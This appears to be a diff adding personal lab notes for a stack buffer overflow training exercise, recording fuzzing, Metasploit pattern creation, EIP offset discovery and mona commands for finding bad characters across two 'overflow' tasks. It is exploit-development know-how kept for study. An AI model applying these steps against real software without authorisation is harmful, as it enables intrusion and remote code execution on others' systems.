@@ -1,0 +1,96 @@
+Fuzzing crashed at 2000 bytes
+
+- crash at 20000
+so i think that was from 1900-2400
+so i make a pattern in msfvenom to get the offset.
+
+Log data, item 17
+ Address=0BADF00D
+ Message=    EIP contains normal pattern : 0x6f43396e (offset 1978)
+
+we found offset at 1978.
+so try to do that thing
+
+with the payload of bad chars, we found esp at : 0195FA30
+
+try to get it on mona :
+!mona bytearray -b "\x00"
+!mona compare -f C:\mona\oscp\bytearray.bin -a 0195FA30
+
+
+mona Memory comparison results, item 0
+ Address=0x0195fa30
+ Status=Corruption after 6 bytes
+ BadChars=00 07 08 2e 2f a0 a1
+ Type=normal
+ Location=Stack
+
+ try to remove 07 from exploit.py
+
+ "x07"
+ still error.
+ Log data, item 21
+ Address=0196FA30
+ Message=Possibly bad chars: 07 2e 2f a0 a1
+
+ try to remove 2e
+ "x07\x2e"
+
+ !mona bytearray -b "\x00\x07\x2e"
+ !mona compare -f C:\mona\oscp\bytearray.bin -a 0194FA30
+
+ try to remove a0 on exploit.py
+ !mona bytearray -b "\x00\x07\x2e\xa0"
+ !mona compare -f C:\mona\oscp\bytearray.bin -a 018FFA30
+
+ and done... we get unmodified result, so the bad char was : \x00\x07\x2e\xa0
+
+ we can exploit it by using jumper, to gain reverse shell. but why bother doing that thing hahahaha
+
+
+# Overflow 2.
+
+reset everything on exploit.
+start the fuzzer
+with prefix overflow2
+
+' Fuzzing crashed at 700 bytes
+
+creating exploit with msfvenom + 400 bytes for our payload.
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1100
+
+copy the payload to our exploit.
+
+got eip : 76413176
+do mona reverse to find exact offset.
+!mona findmsp -distance 1100
+
+Log data, item 18
+ Address=0BADF00D
+ Message=    EIP contains normal pattern : 0x76413176 (offset 634)
+
+yeah that is the exact location with offset 634
+
+`finding bad char.
+we create our payload using python badchars again and pass it to our exploit.py.
+offset = 634
+retn = "BBBB"
+payload = list of chars from our badchar.py
+
+python3 exploit.py
+okay program crash, lets compare it with mona. with the esp address :
+
+!mona bytearray -b "\x00"
+!mona compare -f C:\mona\oscp\bytearray.bin -a 0194FA30
+
+mona Memory comparison results, item 0
+ Address=0x0194fa30
+ Status=Corruption after 34 bytes
+ BadChars=00 23 24 3c 3d 83 84 ba bb
+ Type=normal
+ Location=Stack
+
+okay lets iterate untill we get unmodified result
+
+23 3c 83 ba
+"\x23\x3c\x83\xba"
